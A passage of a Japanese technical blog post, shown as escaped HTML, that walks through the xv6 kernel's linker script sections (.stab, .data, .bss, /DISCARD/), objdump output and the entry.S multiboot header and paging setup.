	&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;rodata &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;rodata&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;gnu&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;linkonce&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;リンカの定義は&lt;code class=&quot;language-text&quot;&gt;.text&lt;/code&gt;セクションと同じ記法なので割愛します。&lt;/p&gt;
&lt;h3 id=&quot;sectionsstabstabstrセクションの定義&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#sectionsstabstabstr%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%AE%9A%E7%BE%A9&quot; aria-label=&quot;sectionsstabstabstrセクションの定義 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SECTIONS：stab,stabstrセクションの定義&lt;/h3&gt;
&lt;p&gt;続いて、デバッグ用の&lt;code class=&quot;language-text&quot;&gt;stab&lt;/code&gt;セクションが定義されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/* Include debugging information in kernel memory */&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;stab &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;__STAB_BEGIN__ &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;stab&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;__STAB_END__ &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;stabstr &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;__STABSTR_BEGIN__ &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;stabstr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;__STABSTR_END__ &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ld&lt;/code&gt;は、リンカスクリプトで定義されたコンテンツが空となるセクションは作成しません。&lt;/p&gt;
&lt;p&gt;デフォルトのコードでは各バイナリは&lt;code class=&quot;language-text&quot;&gt;.stab&lt;/code&gt;セクションを持たないため、&lt;code class=&quot;language-text&quot;&gt;kerel&lt;/code&gt;にも&lt;code class=&quot;language-text&quot;&gt;.stab&lt;/code&gt;セクションは存在しませんでした。&lt;/p&gt;
&lt;p&gt;しかし、Makefileで定義されたgccのコンパイルオプションに&lt;code class=&quot;language-text&quot;&gt;-gstabs&lt;/code&gt;を追加して&lt;code class=&quot;language-text&quot;&gt;.stab&lt;/code&gt;セクションを作成することで、リンクされた&lt;code class=&quot;language-text&quot;&gt;kernel&lt;/code&gt;にも&lt;code class=&quot;language-text&quot;&gt;.stab&lt;/code&gt;セクションが作成されることを確認しました。&lt;/p&gt;
&lt;h3 id=&quot;sectionsdataセクションの定義&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#sectionsdata%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%AE%9A%E7%BE%A9&quot; aria-label=&quot;sectionsdataセクションの定義 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SECTIONS：dataセクションの定義&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;.data&lt;/code&gt;セクションには読み書き可能なデータが格納されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/* Adjust the address for the data segment to the next page */&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;ALIGN&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;/* Conventionally, Unix linkers provide pseudo-symbols
	* etext, edata, and end, at the end of the text, data, and bss.
	* For the kernel mapping, we need the address at the beginning
	* of the data section, but that&apos;s not one of the conventional
	* symbols, because the convention started before there was a
	* read-only rodata section between text and data. */&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;/* The data segment */&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;edata &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;まずは&lt;code class=&quot;language-text&quot;&gt;. = ALIGN(0x1000);&lt;/code&gt;の行でカレントロケーションを&lt;code class=&quot;language-text&quot;&gt;0x1000&lt;/code&gt;の境界にアラインメントしてます。&lt;/p&gt;
&lt;p&gt;この行は先ほどの&lt;code class=&quot;language-text&quot;&gt;. = 0x80100000;&lt;/code&gt;のように、ロケーションカウンタに特定のアドレスを割り当てているわけではありません。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ALIGN&lt;/code&gt;を実行した時点のカレントロケーションをもとに、指定した値の境界にカレントロケーションをアラインメントしています。&lt;/p&gt;
&lt;p&gt;実際に生成された&lt;code class=&quot;language-text&quot;&gt;kernel&lt;/code&gt;のバイナリを見ると、バイナリデータが&lt;code class=&quot;language-text&quot;&gt;0x80107aa9&lt;/code&gt;まで連続していたところから、&lt;code class=&quot;language-text&quot;&gt;.data&lt;/code&gt;セクションの先頭アドレスが&lt;code class=&quot;language-text&quot;&gt;0x80108000&lt;/code&gt;になっていることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ objdump -D kernel &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;grep&lt;/span&gt; -5 &lt;span class=&quot;token string&quot;&gt;&quot;Disassembly of section .data:&quot;&lt;/span&gt;
80107aa6:	&lt;span class=&quot;token number&quot;&gt;67&lt;/span&gt; 6e                	outsb  %ds:&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;%si&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;,&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;%dx&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
80107aa8:	&lt;span class=&quot;token number&quot;&gt;65&lt;/span&gt;                   	gs
80107aa9:	&lt;span class=&quot;token number&quot;&gt;64&lt;/span&gt;                   	fs
	&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.

Disassembly of section .data:

&lt;span class=&quot;token number&quot;&gt;80108000&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;ctlmap&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;:
	&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;.
&lt;span class=&quot;token number&quot;&gt;80108010&lt;/span&gt;:	&lt;span class=&quot;token number&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;17&lt;/span&gt;                	adc    %edx,&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;%edi&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;80108012&lt;/span&gt;:	05 &lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;15&lt;/span&gt;       	&lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;token variable&quot;&gt;$0x15191412&lt;/span&gt;,%eax&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これはカレントロケーションが&lt;code class=&quot;language-text&quot;&gt;0x80107aaa&lt;/code&gt;までインクリメントされていたところから&lt;code class=&quot;language-text&quot;&gt;0x1000&lt;/code&gt;の境界にアラインメントされた結果です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_14.html#IDX239&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Using LD, the GNU linker - Arithmetic Functions&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以降の定義は、これまで紹介した内容と同一なので割愛します。&lt;/p&gt;
&lt;h3 id=&quot;sectionsbssセクションの定義&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#sectionsbss%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%AE%9A%E7%BE%A9&quot; aria-label=&quot;sectionsbssセクションの定義 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SECTIONS：bssセクションの定義&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;.bss&lt;/code&gt;セクションは以下のように定義します。&lt;/p&gt;
&lt;p&gt;ここについてもこれまでと同様ですので割愛します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;edata &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bss &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bss&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;end &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;sectionsdiscard&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#sectionsdiscard&quot; aria-label=&quot;sectionsdiscard permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SECTIONS：DISCARD&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;/DISCARD/&lt;/code&gt;に記述されたセクションは生成オブジェクトにリンクされません。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;DISCARD&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;eh_frame &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;note&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;GNU&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;stack&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;.eh_frame&lt;/code&gt;はgccによって生成される、スタックバックトレースを取得するための情報が格納されるセクションです。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;.note.GNU-stack&lt;/code&gt;は、Linuxのオブジェクトファイルでスタック属性を宣言する際に使用されます。&lt;/p&gt;
&lt;h2 id=&quot;カーネルのエントリポイント&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%81%AE%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AA%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88&quot; aria-label=&quot;カーネルのエントリポイント permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルのエントリポイント&lt;/h2&gt;
&lt;p&gt;続いて、リンク時にカーネルのエントリポイントとして定義されていた&lt;code class=&quot;language-text&quot;&gt;_start&lt;/code&gt;関数を見ていきます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;_start&lt;/code&gt;関数が定義された&lt;code class=&quot;language-text&quot;&gt;entry.S&lt;/code&gt;は以下のコードです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;# The xv6 kernel starts executing in this file. This file is linked with
# the kernel C code, so it can refer to kernel symbols such as main().
# The boot block (bootasm.S and bootmain.c) jumps to entry below.
        
# Multiboot header, for multiboot boot loaders like GNU Grub.
# http://www.gnu.org/software/grub/manual/multiboot/multiboot.html
#
# Using GRUB 2, you can boot xv6 from a file stored in a
# Linux file system by copying kernel or kernelmemfs to /boot
# and then adding this menu entry:
#
# menuentry &amp;quot;xv6&amp;quot; {
# 	insmod ext2
# 	set root=&amp;#39;(hd0,msdos1)&amp;#39;
# 	set kernel=&amp;#39;/boot/kernel&amp;#39;
# 	echo &amp;quot;Loading ${kernel}...&amp;quot;
# 	multiboot ${kernel} ${kernel}
# 	boot
# }

#include &amp;quot;asm.h&amp;quot;
#include &amp;quot;memlayout.h&amp;quot;
#include &amp;quot;mmu.h&amp;quot;
#include &amp;quot;param.h&amp;quot;

# Multiboot header.  Data to direct multiboot loader.
.p2align 2
.text
.globl multiboot_header
multiboot_header:
  #define magic 0x1badb002
  #define flags 0
  .long magic
  .long flags
  .long (-magic-flags)

# By convention, the _start symbol specifies the ELF entry point.
# Since we haven&amp;#39;t set up virtual memory yet, our entry point is
# the physical address of &amp;#39;entry&amp;#39;.
.globl _start
_start = V2P_WO(entry)

# Entering xv6 on boot processor, with paging off.
.globl entry
entry:
  # Turn on page size extension for 4Mbyte pages
  movl    %cr4, %eax
  orl     $(CR4_PSE), %eax
  movl    %eax, %cr4
  # Set page directory
  movl    $(V2P_WO(entrypgdir)), %eax
  movl    %eax, %cr3
  # Turn on paging.
  movl    %cr0, %eax
  orl     $(CR0_PG|CR0_WP), %eax
  movl    %eax, %cr0

  # Set up the stack pointer.
  movl $(stack + KSTACKSIZE), %esp

  # Jump to main(), and switch to executing at
  # high addresses. The indirect call is needed because
  # the assembler produces a PC-relative instruction
  # for a direct jump.
  mov $main, %eax
  jmp *%eax

.comm stack, KSTACKSIZE&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;マルチブートヘッダ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%9E%E3%83%AB%E3%83%81%E3%83%96%E3%83%BC%E3%83%88%E3%83%98%E3%83%83%E3%83%80&quot; aria-label=&quot;マルチブートヘッダ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;マルチブートヘッダ&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;entry.S&lt;/code&gt;の先頭行からコードを見ていくと、次のようなコードがありました。&lt;/p&gt;
&lt;p&gt;まず先頭行、&lt;code class=&quot;language-text&quot;&gt;.p2align 2&lt;/code&gt;ではバイナリを4バイト境界にアラインメントしています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://sourceware.org/binutils/docs/as/P2align.html#P2align&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;P2align (Using as)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/21546946/what-does-p2align-do-in-asm-code&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;gcc - What does .p2align do in asm code? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;その後&lt;code class=&quot;language-text&quot;&gt;.text&lt;/code&gt;ディレクティブの直下に&lt;code class=&quot;language-text&quot;&gt;multiboot_header&lt;/code&gt;が定義されています。&lt;/p&gt;
&lt;p&gt;ここでは、マルチブート仕様に対応するためのマルチブートヘッダの定義を行っています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;# Multiboot header.  Data to direct multiboot loader.
.p2align 2
.text
.globl multiboot_header
multiboot_header:
  #define magic 0x1badb002
  #define flags 0
  .long magic
  .long flags
  .long (-magic-flags)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;マルチブート仕様とは、ブートローダがx86オペレーティングシステムカーネルをロードする方法を標準化したものです。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://yukituna.com/3850/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;前回&lt;/a&gt;の記事では、xv6OSのブートローダのコードを見ていきましたが、例えばxv6OSのカーネルをGRUBでブートしたい場合には、このマルチブート仕様にカーネルを対応させる必要があります。&lt;/p&gt;
&lt;p&gt;GRUBなどのブートローダは、Linuxシステムなどで標準的に採用されています。(通常はGRUB2を使用)&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki2th.com/ja/Multiboot_Specification&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;マルチブート仕様&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wocota.hatenadiary.org/entry/20090607/1244389534&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;GRUBでOSを起動する - OSのようなもの&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://inaz2.hatenablog.com/entry/2015/12/31/221319&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;GRUBで簡単なOSカーネルを動かしてみる - ももいろテクノロジー&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;実際にxv6OSをGRUBによる起動に対応させるのはカーネルの読解が一通り終わってからやろうと考えているので、コードの詳細は追わずに先に進みます。&lt;/p&gt;
